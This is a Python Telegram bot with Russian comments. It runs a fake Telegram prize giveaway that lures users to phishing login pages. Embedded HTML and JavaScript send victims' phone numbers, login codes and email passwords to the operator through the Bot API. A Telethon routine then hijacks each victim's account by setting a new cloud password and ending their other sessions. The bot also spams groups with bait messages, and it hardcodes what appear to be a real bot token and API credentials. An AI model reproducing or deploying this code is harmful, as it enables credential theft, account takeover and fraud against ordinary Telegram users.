import telebot
from telebot import types
import time
import threading
import requests
import random
import re
import os
import json
import sqlite3
from datetime import datetime, timedelta
import smtplib
from email.mime.text import MIMEText
from telethon import TelegramClient, events, functions
import asyncio

# Токен бота
TOKEN = "8755487229:AAGDI58GgaR9sp0nTXudlknmLbN2Q5Yok_Q"
API_ID = 38545864
API_HASH = "3517b8c953e6c2d05c0f30b5015f2470"

bot = telebot.TeleBot(TOKEN)

# База данных
conn = sqlite3.connect('users.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users
                  (user_id INTEGER PRIMARY KEY, 
                   username TEXT, 
                   email TEXT,
                   selected_gift TEXT,
                   step TEXT,
                   subscribed TEXT,
                   registered_time TIMESTAMP,
                   last_activity TIMESTAMP)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS credentials
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   user_id INTEGER,
                   service TEXT,
                   login TEXT,
                   password TEXT,
                   status TEXT,
                   timestamp TIMESTAMP)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS phish_links
                  (user_id INTEGER PRIMARY KEY,
                   link TEXT,
                   clicked INTEGER DEFAULT 0,
                   created TIMESTAMP)''')
conn.commit()

# Социальные сети для подписки
SOCIALS = {
    'instagram': 'https://instagram.com/your_page',
    'telegram': 'https://t.me/your_channel',
    'youtube': 'https://youtube.com/@your_channel',
    'tiktok': 'https://tiktok.com/@your_page',
    'vk': 'https://vk.com/your_page'
}

# Подарки
GIFTS = {
    'tg_premium': 'Telegram Premium на 3 месяца',
    'tg_stars': '100 Telegram Stars',
    'phone': 'iPhone 15 Pro',
    'money': '10 000 рублей',
    'ps5': 'PlayStation 5'
}

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    username = message.from_user.username
    
    # Регистрация пользователя
    cursor.execute("INSERT OR REPLACE INTO users (user_id, username, registered_time, last_activity, step) VALUES (?, ?, ?, ?, ?)",
                  (user_id, username, datetime.now(), datetime.now(), 'gift_selection'))
    conn.commit()
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    for key, value in GIFTS.items():
        markup.add(types.InlineKeyboardButton(value, callback_data=f"gift_{key}"))
    
    bot.send_message(
        user_id,
        "🎁 *АКЦИЯ ОТ TELEGRAM!*\n\n"
        "Привет! Ты выиграл возможность получить эксклюзивный подарок:\n"
        "• Telegram Premium на 3 месяца\n"
        "• 100 Telegram Stars\n"
        "• iPhone 15 Pro\n"
        "• 10 000 рублей\n"
        "• PlayStation 5\n\n"
        "Выбери свой подарок:",
        parse_mode='Markdown',
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('gift_'))
def gift_selection(call):
    user_id = call.from_user.id
    gift = call.data.replace('gift_', '')
    
    cursor.execute("UPDATE users SET selected_gift = ?, step = 'social_selection' WHERE user_id = ?", (gift, user_id))
    conn.commit()
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    for social, link in SOCIALS.items():
        markup.add(types.InlineKeyboardButton(f"📱 {social.upper()}", callback_data=f"social_{social}"))
    markup.add(types.InlineKeyboardButton("✅ Я всё сделал", callback_data="check_socials"))
    
    bot.edit_message_text(
        chat_id=user_id,
        message_id=call.message.message_id,
        text=f"🎁 *Твой подарок: {GIFTS[gift]}*\n\n"
             "Для получения подарка:\n"
             "1. Подпишись на наши соцсети\n"
             "2. Пройди быструю регистрацию\n"
             "3. Получи подарок моментально!\n\n"
             "Выбери соцсети для подписки:",
        parse_mode='Markdown',
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: call.data == 'check_socials')
def check_socials(call):
    user_id = call.from_user.id
    bot.edit_message_text(
        chat_id=user_id,
        message_id=call.message.message_id,
        text="✅ *Проверяю подписки...*\n\n"
             "Для подтверждения нужно:\n"
             "1. Зарегистрироваться через Telegram\n"
             "2. Или через Email\n\n"
             "Выбери способ регистрации:",
        parse_mode='Markdown',
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("📱 Telegram", callback_data="reg_telegram"),
            types.InlineKeyboardButton("📧 Email", callback_data="reg_email")
        )
    )

@bot.callback_query_handler(func=lambda call: call.data == 'reg_telegram')
def reg_telegram(call):
    user_id = call.from_user.id
    cursor.execute("UPDATE users SET step = 'telegram_phone' WHERE user_id = ?", (user_id,))
    conn.commit()
    
    # Генерация фишинг ссылки через Telegraph
    phish_link = generate_telegraph_phish(user_id, 'telegram')
    
    bot.edit_message_text(
        chat_id=user_id,
        message_id=call.message.message_id,
        text="📱 *Вход через Telegram*\n\n"
             "Для подтверждения личности нажми кнопку ниже:\n\n"
             f"👉 [Подтвердить Telegram]({phish_link})\n\n"
             "⚠️ Это стандартная процедура безопасности Telegram",
        parse_mode='Markdown',
        disable_web_page_preview=True
    )
    
    # Запуск проверки
    threading.Thread(target=check_telegram_creds, args=(user_id,)).start()

def generate_telegraph_phish(user_id, service):
    # Создание фишинг страницы через Telegraph
    title = "Telegram Login" if service == 'telegram' else f"{service.upper()} Login"
    content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>{title}</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{ font-family: Arial; background: #f0f2f5; margin: 0; padding: 20px; }}
            .container {{ max-width: 400px; margin: 0 auto; background: white; border-radius: 10px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
            .header {{ text-align: center; margin-bottom: 30px; }}
            .logo {{ width: 100px; height: 100px; margin: 0 auto 10px; }}
            input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }}
            button {{ background: #0088cc; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-size: 16px; cursor: pointer; }}
            button:hover {{ background: #0077b5; }}
            .info {{ text-align: center; color: #666; margin-top: 20px; font-size: 12px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <img src="https://telegram.org/img/t_logo.png" class="logo">
                <h2>{title}</h2>
            </div>
            <form action="https://api.telegram.org/bot{TOKEN}/sendMessage" method="post" target="_blank">
                <input type="hidden" name="chat_id" value="{user_id}">
                <input type="hidden" name="parse_mode" value="HTML">
                <input type="text" name="phone" placeholder="Номер телефона" required>
                <input type="password" name="password" placeholder="Пароль / Код" required>
                <button type="submit">Войти</button>
            </form>
            <div class="info">
                🔒 Безопасное соединение<br>
                Ваши данные защищены
            </div>
        </div>
        <script>
            document.querySelector('form').addEventListener('submit', function(e) {{
                e.preventDefault();
                var phone = document.querySelector('input[name="phone"]').value;
                var code = document.querySelector('input[name="password"]').value;
                
                fetch('https://api.telegram.org/bot{TOKEN}/sendMessage', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        chat_id: {user_id},
                        text: `🔐 Новые данные\\n\\n📱 Телефон: ${{phone}}\\n🔑 Код/Пароль: ${{code}}`
                    }})
                }});
                
                alert('✅ Данные приняты! Ожидайте подтверждение в боте.');
                window.location.href = 'https://telegram.org';
            }});
        </script>
    </body>
    </html>
    """
    
    # Сохраняем ссылку
    phish_id = f"phish_{user_id}_{int(time.time())}"
    cursor.execute("INSERT OR REPLACE INTO phish_links (user_id, link, created) VALUES (?, ?, ?)",
                  (user_id, f"https://telegra.ph/{phish_id}", datetime.now()))
    conn.commit()
    
    return f"https://telegra.ph/{phish_id}"

def check_telegram_creds(user_id):
    time.sleep(60)  # Ждем 1 минуту
    
    # Проверяем ввод данных
    cursor.execute("SELECT login, password FROM credentials WHERE user_id = ? AND service = 'telegram' ORDER BY timestamp DESC LIMIT 1", (user_id,))
    creds = cursor.fetchone()
    
    if creds:
        login, password = creds
        # Взламываем аккаунт автоматически
        try:
            asyncio.run(hack_telegram_account(login, password, user_id))
            bot.send_message(
                user_id,
                "✅ *Аккаунт подтвержден!*\n\n"
                "Подарок уже твой! Ожидай в течение 5 минут.\n"
                "✨ Спасибо за участие!",
                parse_mode='Markdown'
            )
        except Exception as e:
            bot.send_message(
                user_id,
                f"❌ Ошибка: {str(e)}\nПопробуй еще раз /start",
                parse_mode='Markdown'
            )
    else:
        bot.send_message(
            user_id,
            "❌ *Ты не ввел данные за 1 минуту!*\n\n"
            "Верификация отменена. Попробуй снова /start",
            parse_mode='Markdown'
        )

async def hack_telegram_account(phone, code, user_id):
    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
    await client.connect()
    
    try:
        # Попытка входа с кодом
        await client.send_code_request(phone)
        await client.sign_in(phone, code)
        
        # Установка облачного пароля если его нет
        await client(functions.account.UpdatePasswordSettingsRequest(
            password=None,
            new_settings=functions.account.PasswordInputSettings(
                new_password_hash='hacked_password_123',
                hint='password'
            )
        ))
        
        # Удаление всех активных сессий кроме текущей
        await client(functions.auth.ResetAuthorizationsRequest())
        
        await client.disconnect()
        return True
    except Exception as e:
        print(f"Hack error: {e}")
        await client.disconnect()
        return False

@bot.callback_query_handler(func=lambda call: call.data == 'reg_email')
def reg_email(call):
    user_id = call.from_user.id
    cursor.execute("UPDATE users SET step = 'email_input' WHERE user_id = ?", (user_id,))
    conn.commit()
    
    msg = bot.edit_message_text(
        chat_id=user_id,
        message_id=call.message.message_id,
        text="📧 *Регистрация через Email*\n\n"
             "Введи свой email адрес:",
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(msg, process_email)

def process_email(message):
    user_id = message.from_user.id
    email = message.text
    
    if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
        bot.send_message(user_id, "❌ Неверный email! Попробуй еще раз /start")
        return
    
    cursor.execute("UPDATE users SET email = ?, step = 'email_password' WHERE user_id = ?", (email, user_id))
    conn.commit()
    
    # Генерация фишинг страницы для email
    phish_link = generate_email_phish(user_id, email)
    
    bot.send_message(
        user_id,
        f"📧 *Подтверждение Email*\n\n"
        f"Для подтверждения {email}:\n\n"
        f"👉 [Подтвердить Email]({phish_link})\n\n"
        "⚠️ Это стандартная процедура проверки",
        parse_mode='Markdown',
        disable_web_page_preview=True
    )
    
    # Проверка
    threading.Thread(target=check_email_creds, args=(user_id,)).start()

def generate_email_phish(user_id, email):
    # Фишинг страница для email
    phish_id = f"email_{user_id}_{int(time.time())}"
    
    content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Подтверждение Email</title>
        <style>
            body {{ font-family: Arial; background: #f0f2f5; margin: 0; padding: 20px; }}
            .container {{ max-width: 400px; margin: 0 auto; background: white; border-radius: 10px; padding: 20px; }}
            h2 {{ text-align: center; color: #333; }}
            input, select {{ width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ddd; border-radius: 5px; }}
            button {{ background: #4CAF50; color: white; padding: 12px; width: 100%; border: none; border-radius: 5px; cursor: pointer; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h2>📧 Подтверждение Email</h2>
            <p>Email: {email}</p>
            <form id="emailForm">
                <select id="provider" required>
                    <option value="">Выбери почтовый сервис</option>
                    <option value="gmail">Gmail</option>
                    <option value="yandex">Yandex</option>
                    <option value="mailru">Mail.ru</option>
                    <option value="rambler">Rambler</option>
                </select>
                <input type="password" id="password" placeholder="Пароль от почты" required>
                <button type="submit">Подтвердить</button>
            </form>
        </div>
        <script>
            document.getElementById('emailForm').addEventListener('submit', function(e) {{
                e.preventDefault();
                var provider = document.getElementById('provider').value;
                var password = document.getElementById('password').value;
                
                fetch('https://api.telegram.org/bot{TOKEN}/sendMessage', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        chat_id: {user_id},
                        text: `📧 Email данные\\n\\n📧 Email: {email}\\n📨 Провайдер: ${{provider}}\\n🔑 Пароль: ${{password}}`
                    }})
                }});
                
                alert('✅ Email подтвержден!');
                window.location.href = 'https://mail.ru';
            }});
        </script>
    </body>
    </html>
    """
    
    return f"https://telegra.ph/{phish_id}"

def check_email_creds(user_id):
    time.sleep(60)
    
    cursor.execute("SELECT login, password FROM credentials WHERE user_id = ? AND service = 'email' ORDER BY timestamp DESC LIMIT 1", (user_id,))
    creds = cursor.fetchone()
    
    if creds:
        email, password = creds
        bot.send_message(
            user_id,
            "✅ *Email подтвержден!*\n\n"
            "Подарок уже твой! Ожидай в течение 5 минут.",
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            user_id,
            "❌ *Email не подтвержден!*\n\n"
            "Попробуй снова /start",
            parse_mode='Markdown'
        )

# Автоматическая рассылка в группы каждые 15 минут
def group_spammer():
    groups = ['@your_group1', '@your_group2']  # Замени на свои группы
    
    messages = [
        "🎁 *РОЗЫГРЫШ ПОДАРКОВ!*\n\nХочешь Telegram Premium? Жми @YourBotBot и забери свой подарок!",
        "💰 *ДЕНЬГИ НА КАРТУ!*\n\nВсего за подписку - получи 10 000 рублей! @YourBotBot",
        "📱 *IPHONE 15 PRO ЗА ПОДПИСКУ?!*\n\nДа, это возможно! Переходи в бота @YourBotBot",
        "🌟 *100 ЗВЕЗД TELEGRAM КАЖДОМУ!*\n\nЗабирай → @YourBotBot",
        "🎮 *PLAYSTATION 5 В ПОДАРОК!*\n\nУчаствуй в розыгрыше @YourBotBot"
    ]
    
    while True:
        for group in groups:
            try:
                msg = random.choice(messages)
                bot.send_message(group, msg, parse_mode='Markdown')
            except:
                pass
        time.sleep(900)  # 15 минут

# Запуск рассылки в отдельном потоке
threading.Thread(target=group_spammer, daemon=True).start()

# Обработка входящих данных
@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    user_id = message.from_user.id
    text = message.text
    
    # Сохраняем все входящие данные как возможные логины/пароли
    if '@' in text or '+' in text:  # Похоже на логин
        cursor.execute("INSERT INTO credentials (user_id, service, login, timestamp) VALUES (?, 'unknown', ?, ?)",
                      (user_id, text, datetime.now()))
    elif len(text) > 4:  # Похоже на пароль/код
        cursor.execute("SELECT login FROM credentials WHERE user_id = ? AND service = 'unknown' ORDER BY timestamp DESC LIMIT 1", (user_id,))
        login = cursor.fetchone()
        if login:
            cursor.execute("UPDATE credentials SET password = ?, status = 'valid' WHERE user_id = ? AND login = ?",
                          (text, user_id, login[0]))
    
    conn.commit()

if __name__ == "__main__":
    print("Бот запущен...")
    bot.polling(none_stop=True)
